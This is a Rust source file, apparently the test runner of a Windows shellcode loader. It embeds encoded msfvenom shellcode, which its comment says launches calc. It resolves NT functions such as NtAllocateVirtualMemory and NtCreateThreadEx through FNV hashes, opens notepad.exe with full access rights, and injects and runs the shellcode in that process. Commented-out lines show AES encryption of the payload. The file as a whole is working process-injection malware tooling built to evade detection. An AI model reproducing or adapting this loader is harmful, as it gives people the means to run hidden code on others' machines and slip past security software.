//! testing/debugging runner binary

#![no_std]
extern crate alloc;

mod loader;

use crate::loader::Loader;
use anyhow::Result;
use common::hashing::fnv::Fnv;
use common::hashing::traits::StringHasher;
use common::remote::process::Processes;
use common::util::search_env;
use core::ffi::c_void;
use core::ptr::null_mut;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;

// --- $ msfvenom -p windows/x64/cmd cmd='calc' exitfunc='thread' -e x64/zutto_dekiru -i 5
const SHELLCODE: [u8; 526] = [
    0x49, 0xbf, 0x89, 0xfc, 0x8b, 0x89, 0x40, 0x7d, 0x4a, 0x16, 0x54, 0x59, 0x4d, 0x31, 0xdb, 0xdb,
    0xdf, 0x41, 0xb3, 0x3c, 0x66, 0x81, 0xe1, 0x80, 0xf4, 0x48, 0x0f, 0xae, 0x01, 0x4c, 0x8b, 0x69,
    0x08, 0x49, 0xff, 0xcb, 0x4f, 0x31, 0x7c, 0xdd, 0x1f, 0x4d, 0x85, 0xdb, 0x75, 0xf3, 0xc4, 0xcd,
    0x74, 0xc8, 0xf7, 0x4b, 0x93, 0xfe, 0xc1, 0x75, 0x68, 0xc1, 0xff, 0x0f, 0xf8, 0x46, 0xda, 0xfb,
    0xe2, 0x36, 0x9a, 0x1b, 0xcb, 0xf5, 0x19, 0x08, 0xc3, 0x86, 0xee, 0x7e, 0x06, 0x9d, 0xea, 0xf4,
    0xc2, 0x76, 0x8f, 0x36, 0x7b, 0x6a, 0x75, 0xd5, 0xc6, 0x0c, 0xbf, 0x08, 0xb9, 0x30, 0xe2, 0x67,
    0x99, 0xd3, 0x64, 0xf3, 0x74, 0x02, 0x7a, 0x2d, 0x3d, 0x2e, 0xd5, 0x83, 0x24, 0x4b, 0x73, 0x13,
    0x84, 0xbd, 0xa1, 0x6f, 0x01, 0x81, 0x64, 0x45, 0x91, 0x81, 0x87, 0x87, 0x90, 0x2d, 0xb8, 0x69,
    0xd0, 0xc7, 0xa2, 0x9f, 0x90, 0x2d, 0xc4, 0x60, 0x92, 0xbf, 0x55, 0x21, 0xa4, 0x29, 0xbe, 0x48,
    0xad, 0x7d, 0x3d, 0x78, 0xfd, 0x12, 0x69, 0x01, 0xb6, 0xbc, 0x13, 0x70, 0xfd, 0x49, 0x58, 0x01,
    0x88, 0xc9, 0x30, 0xf1, 0x51, 0x71, 0xdd, 0x25, 0x06, 0xae, 0x20, 0x18, 0xd0, 0xdb, 0x19, 0x61,
    0xcf, 0xe4, 0xb0, 0xf9, 0x50, 0x42, 0xe7, 0x49, 0xcf, 0x98, 0xbe, 0xbd, 0x29, 0x8d, 0x73, 0x79,
    0xcf, 0xe2, 0xae, 0x84, 0xeb, 0xf7, 0x4f, 0x28, 0x06, 0x03, 0x55, 0x71, 0xb0, 0x00, 0x6c, 0x22,
    0x25, 0xc8, 0x97, 0x1a, 0xe2, 0xd8, 0x87, 0x49, 0xae, 0x92, 0x6c, 0x88, 0x28, 0x67, 0x05, 0x81,
    0x41, 0x9c, 0x9c, 0x70, 0x81, 0xfe, 0xce, 0x80, 0xb1, 0xfb, 0xd4, 0x08, 0x5e, 0x76, 0xd1, 0x80,
    0xcb, 0xfb, 0xe9, 0xca, 0x48, 0x5c, 0xaf, 0x47, 0x44, 0xd1, 0x7f, 0xd1, 0xb4, 0x14, 0x6d, 0xf2,
    0xf5, 0x69, 0xed, 0x80, 0xe2, 0x5c, 0x1d, 0x71, 0xd1, 0x71, 0x34, 0x83, 0xd4, 0x5c, 0xa7, 0xf1,
    0xac, 0x71, 0x34, 0x83, 0x94, 0x5c, 0xa7, 0xd1, 0xe4, 0x71, 0xb0, 0x66, 0xfe, 0x5e, 0x61, 0x92,
    0x7d, 0x71, 0x8e, 0x11, 0x18, 0x28, 0x4d, 0xdf, 0xb6, 0x15, 0x9f, 0x90, 0x75, 0xdd, 0x21, 0xe2,
    0xb5, 0xf8, 0x5d, 0x3c, 0xe6, 0x55, 0x7d, 0xeb, 0x3f, 0x6b, 0x9f, 0x5a, 0xf6, 0x28, 0x64, 0xa2,
    0x64, 0xb2, 0x3f, 0x59, 0xb4, 0x14, 0x2c, 0xeb, 0x31, 0xf9, 0xcb, 0xb6, 0xfc, 0x15, 0xfc, 0xf3,
    0x3f, 0x71, 0xa7, 0x95, 0x3f, 0x54, 0x0c, 0xea, 0xb5, 0xe9, 0x5c, 0x87, 0xfc, 0xeb, 0xe5, 0xe2,
    0x3f, 0x0d, 0x37, 0x99, 0xb5, 0xc2, 0x61, 0x92, 0x7d, 0x71, 0x8e, 0x11, 0x18, 0x55, 0xed, 0x6a,
    0xb9, 0x78, 0xbe, 0x10, 0x8c, 0xf4, 0x59, 0x52, 0xf8, 0x3a, 0xf3, 0xf5, 0xbc, 0x51, 0x15, 0x72,
    0xc1, 0xe1, 0xe7, 0x95, 0x3f, 0x54, 0x08, 0xea, 0xb5, 0xe9, 0xd9, 0x90, 0x3f, 0x18, 0x64, 0xe7,
    0x3f, 0x79, 0xa3, 0x98, 0xb5, 0xc4, 0x6d, 0x28, 0xb0, 0xb1, 0xf7, 0xd0, 0x64, 0x55, 0x74, 0xe2,
    0xec, 0x67, 0xe6, 0x8b, 0xf5, 0x4c, 0x6d, 0xfa, 0xf5, 0x63, 0xf7, 0x52, 0x58, 0x34, 0x6d, 0xf1,
    0x4b, 0xd9, 0xe7, 0x90, 0xed, 0x4e, 0x64, 0x28, 0xa6, 0xd0, 0xe8, 0x2e, 0x4b, 0xeb, 0x71, 0xeb,
    0x0e, 0x38, 0xbf, 0xd1, 0xb4, 0x14, 0x2c, 0xa3, 0xb4, 0x71, 0x32, 0x5c, 0xb5, 0x15, 0x2c, 0xa3,
    0xf5, 0x83, 0x8e, 0x5a, 0xdb, 0x93, 0xd3, 0x76, 0x0f, 0xd9, 0xa2, 0xfb, 0xbe, 0x55, 0x96, 0x05,
    0x21, 0x84, 0x22, 0x2e, 0x61, 0x5c, 0xaf, 0x67, 0x9c, 0x05, 0xb9, 0xad, 0xbe, 0x94, 0xd7, 0x43,
    0xc1, 0x3c, 0x04, 0x96, 0xa7, 0x66, 0x43, 0xc9, 0xb4, 0x60, 0xfe, 0x58, 0x6e, 0xeb, 0xf9, 0xc0,
    0xd5, 0x55, 0xdc, 0xd1, 0x3d, 0xd5, 0xe5, 0x08, 0x14, 0xf6, 0x9a, 0x80, 0xd1, 0x5e,
];

fn main() -> Result<()> {

    // let mut encryptor = AesProtectedKey::<16>::new()?;
    // let ciphertext = encryptor.encrypt(SHELLCODE.as_slice());
    // println!("key data: {:#02x?}", encryptor);
    // print_cipher_bytes(ciphertext.as_slice());

    // let injection_plain: [&str; 6] = [
    //     "NtAllocateVirtualMemory",
    //     "NtProtectVirtualMemory",
    //     "NtCreateThreadEx",
    //     "NtWaitForSingleObject",
    //     "NtClose",
    //     "NtWriteVirtualMemory",
    // ]

    let hasher = StringHasher::new(Fnv);

    let hashes: [u32; 6] = [
        0x0000002dca3638,   // NtAllocateVirtualMemory
        0x00000009aecd66,   // NtProtectVirtualMemory
        0x00000059a5081a,   // NtCreateThreadEx
        0x000000d812fb6e,   // NtWaitForSingleObject
        0x000000354d9e65,   // NtClose
        0x00000042b12852,   // NtWriteVirtualMemory
    ];

    let environment_variables: [&str; 4] = [
        "Path",
        "APPDATA",
        "windir",
        "NUMBER_",
    ];

    for var in environment_variables {
        let res = unsafe { search_env(Some(var)) };
        _ = res;
    }

    let mut proc_handle: *mut c_void = null_mut();
    if let Ok(notepad_exe) = Processes::get("notepad.exe") {
        proc_handle = unsafe {
            OpenProcess(
                PROCESS_ACCESS_RIGHTS(PROCESS_ALL_ACCESS),
                true,
                notepad_exe.UniqueProcessId.0 as _,
            )?
        }.0;
    }

    let mut loader = Loader::new(hashes.to_vec(), Some(proc_handle), Fnv);

    loader.inject_remote(SHELLCODE.as_slice())?;
    loader.run_thread(Some(0))?;

    Ok(())
}
